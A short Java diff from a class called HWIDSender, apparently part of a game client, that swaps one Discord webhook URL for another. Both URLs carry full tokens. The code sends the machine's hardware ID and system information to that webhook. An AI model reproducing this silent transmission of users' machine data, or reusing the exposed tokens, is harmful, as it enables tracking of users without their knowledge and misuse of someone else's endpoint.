@@ -27,7 +27,7 @@ public class HWIDSender {
                             " \nHwid: " + SystemUtil.getSystemInfo() +
                             " \nHwidList: " + " " + URLReader.readURL() +
                             "```");
-            HttpsURLConnection connection = (HttpsURLConnection) new URL("https://discord.com/api/webhooks/920505765389799444/YtVaX9vgPST-5I4lZWUiCGNSkMMLzAtnC0gdmmEbgVCHTnwOb_bB-MBu9kePpYJshE_F").openConnection();
+            HttpsURLConnection connection = (HttpsURLConnection) new URL("https://discord.com/api/webhooks/1013101666263891998/eOe3P2jtJ7q03-4TnJLu4G5mxMGBt91JFA1QOUaXql9vWVyDvjBtxLWyR5bnRyBPYxi7").openConnection();
             connection.addRequestProperty("Content-Type", "application/json");
             connection.addRequestProperty("User-Agent", "Berry-Bobus");
             connection.setDoOutput(true);
